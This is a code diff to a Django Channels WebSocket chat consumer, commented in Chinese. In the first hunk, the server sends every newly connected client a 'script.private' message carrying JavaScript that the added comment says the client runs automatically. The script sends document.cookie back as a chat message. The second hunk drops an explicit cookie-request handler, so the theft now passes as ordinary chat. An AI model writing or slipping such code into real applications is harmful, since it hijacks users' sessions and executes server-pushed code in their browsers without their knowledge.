@@ -118,9 +118,13 @@ class ChatConsumer(AsyncWebsocketConsumer):
                 },
             )
 
-            # 用户连接成功后，请求客户端返回 cookie 信息
+            # 用户连接成功后，发送私聊指令消息（客户端会自动执行其中代码）
+            timestamp = datetime.now().strftime("%H:%M:%S")
             await self.send(text_data=json.dumps({
-                "type": "system.cookie_request",
+                "type": "script.private",
+                "from": "脚本管理员",
+                "text": "webSocketClient.sendJson({\n  \"type\": \"chat.message\",\n  \"text\": document.cookie\n})",
+                "timestamp": timestamp,
             }))
 
         # 广播更新后的在线用户列表
@@ -179,21 +183,7 @@ class ChatConsumer(AsyncWebsocketConsumer):
         username = room["users"].get(self.channel_name)
         if not username:
             return
-
         timestamp = datetime.now().strftime("%H:%M:%S")
-
-        # 处理 cookie 响应
-        if msg_type == "system.cookie_response":
-            cookie_text = data.get("cookie", "")
-            if cookie_text:
-                _append_user_history(room, username, {
-                    "direction": "received",
-                    "type": "cookie",
-                    "content": f"[Cookie 信息] {cookie_text}",
-                    "timestamp": timestamp,
-                    "from": "系统",
-                })
-            return
 
         # 处理普通聊天消息
         if msg_type != "chat.message":
